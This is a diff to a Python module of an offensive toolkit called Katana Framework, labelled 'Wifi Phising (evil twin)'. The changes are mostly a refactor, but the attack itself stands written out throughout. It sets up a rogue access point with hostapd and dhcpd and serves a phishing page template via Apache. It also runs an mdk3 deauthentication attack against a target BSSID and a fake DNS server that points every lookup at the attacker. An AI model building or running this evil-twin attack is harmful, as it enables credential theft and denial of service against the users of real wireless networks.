@@ -3,11 +3,10 @@
 
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 # Katana Core import                  #
-from core.KATANAFRAMEWORK import *    #
+from core.KatanaFramework import *    #
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 
 # LIBRARIES  
-from core.Function import get_interfaces,get_monitors_mode,checkDevice,CheckAPmode,Subprocess,status_cmd
 import commands,socket,time
 # END LIBRARIES 
 
@@ -18,7 +17,7 @@ def init():
 	init.Description        ="Wifi Phising (evil twin)"
 	init.CodeName           ="wifi/ev.twin"
 	init.DateCreation       ="31/05/2016"      
-	init.LastModification   ="09/07/2016"
+	init.LastModification   ="25/12/2016"
 	init.References         =None
 	init.License            =KTF_LINCENSE
 	init.var                ={}
@@ -36,24 +35,22 @@ def init():
 	# EXTRA OPTIONS MODULE
 	init.extra = {
 		# NAME    VALUE                        RQ     DESCRIPTION
-		'ip_range':["192.168.1.1"             ,False,'Ip Range'],
+		'ip_range':["192.168.1.1"             ,False,'Ip Range']
 	}
 	# AUX INFORMATION MODULE
-	init.aux = """
- Devices Founds: """+str(get_interfaces())+"""
- Monitors Inter: """+str(get_monitors_mode())+"""
- Functions     : For Scan Ap's, type 'f::get_aps(Monitor_Interface,Time)'
-                 For Start Monitor Mode, type 'f::start_monitor(Interface)' 
- """
+	init.aux = "\n Devices Founds: "+str(NET.GetInterfacesOnSystem())
+	init.aux += "\n Monitors Inter: "+str(NET.GetMonitorInterfaces())
+	init.aux += "\n Functions     : For Scan Ap's, type 'f::getaps(Monitor_Interface,Time)"
+	init.aux += "\n                  For Start Monitor Mode, type 'f::startmonitormode(Interface)\n" 
 	return init
 # END INFORMATION MODULE
 
 # CODE MODULE    ############################################################################################
 def main(run):
-	if CheckAPmode():
+	if InterfaceSupportAPMode():
 		Loadingfile(init.var['template'])
 		process=commands.getoutput("airmon-ng check $INTERFACE | tail -n +8 | grep -v \"on interface\" | awk '{ print $2 }'")
-		printAlert(0,"Killing proccess on interface")
+		printk.inf("Killing proccess on interface")
 		process=process.split("\n")
 		for p in process:
 			commands.getoutput("killall "+p)
@@ -62,7 +59,7 @@ def main(run):
 		rango=rangos[0]+"."+rangos[1]+"."+rangos[3]+".1"
 		rangov=rangos[0]+"."+rangos[1]+"."+rangos[3]
 
-		printAlert(0,"Setting tables ["+rango+"]")
+		printk.inf("Setting tables ["+rango+"]")
 		commands.getoutput("ifconfig "+init.var['drive']+" up")
 		commands.getoutput("ifconfig "+init.var['drive']+" "+init.var['ip_range']+" netmask 255.255.255.0")
 		commands.getoutput("route add -net "+rango+" netmask 255.255.255.0 gw "+init.var['ip_range'])
@@ -91,22 +88,22 @@ def main(run):
 		commands.getoutput("echo }>> tmp/dhcpd.config")
 		commands.getoutput("echo "+init.var['bssid']+" > tmp/target.log")
 
-		printAlert(0,"Starting Apache Server                   "+status_cmd("service apache2 start"))
-		printAlert(0,"Coping Files to Server                   "+status_cmd("cp -r "+init.var['template']+"* "+PATCH_WWW))
-		printAlert(0,"Starting Access Point ["+init.var['essid']+"]")
-		Subprocess("hostapd tmp/hostapd.conf")
+		#printk.inf("Starting Apache Server                   "+status_cmd("service apache2 start"))
+		#printk.inf("Coping Files to Server                   "+status_cmd("cp -r "+init.var['template']+"* "+PATCH_WWW))
+		#printk.inf("Starting Access Point ["+init.var['essid']+"]")
+		SYSTEM.Subprocess("hostapd tmp/hostapd.conf")
 		time.sleep(3)
-		printAlert(0,"Starting DHCP server")
-		Subprocess("dhcpd -d -f -cf tmp/dhcpd.config")
+		printk.inf("Starting DHCP server")
+		SYSTEM.Subprocess("dhcpd -d -f -cf tmp/dhcpd.config")
 		time.sleep(3)
-		printAlert(0,"Starting DOS attack to "+init.var['bssid'])
-		Subprocess("mdk3 "+init.var['driveMon']+" d -b tmp/target.log -c "+init.var['channel'])
-		print(printAlert(8,"(PRESS Ctrol+C) to stop Attack"))
+		printk.inf("Starting DOS attack to "+init.var['bssid'])
+		SYSTEM.Subprocess("mdk3 "+init.var['driveMon']+" d -b tmp/target.log -c "+init.var['channel'])
+		raw_input(printk.pkey("if you want to stop AP (PRESS [ENTER])"))
 		DNSFAKE()
-		commands.getoutput("killall dhcpd")
-		commands.getoutput("killall hostapd")
-		commands.getoutput("killall mdk3")
-		commands.getoutput("service NetworkManager start")
+		SYSTEM.KillProcess("dhcpd")
+		SYSTEM.KillProcess("hostapd")
+		SYSTEM.KillProcess("mdk3")
+		SYSTEM.KillProcess("NetworkManager start")
 		commands.getoutput("iptables --flush")
 		commands.getoutput("iptables --table nat --flush")
 		commands.getoutput("iptables --delete-chain")
@@ -114,8 +111,8 @@ def main(run):
 		for p in process:
 			commands.getoutput("service "+p+" start")
 
-		printAlert(0,"Removing files                           "+status_cmd("rm -r "+PATCH_WWW+"* ; rm tmp/hostapd.conf; rm tmp/dhcpd.config; rm tmp/target.log"))
-		printAlert(0,"Stoping Apache Server                    "+status_cmd("service apache2 stop"))
+		#printk.inf("Removing files                           "+status_cmd("rm -r "+PATCH_WWW+"* ; rm tmp/hostapd.conf; rm tmp/dhcpd.config; rm tmp/target.log"))
+		#printk.inf("Stoping Apache Server                    "+status_cmd("service apache2 stop"))
 		Space()
 
 # CODE MODULE    ############################################################################################
@@ -158,5 +155,5 @@ def DNSFAKE():
       udps.sendto(p.respuesta(ip), addr)
       print "  | from "+str(addr[0])+' Request: %s -> %s' % (p.dominio, ip)
   except KeyboardInterrupt:
-    printAlert(0,'Stoping')
+    printk.inf('Stoping')
     udps.close()
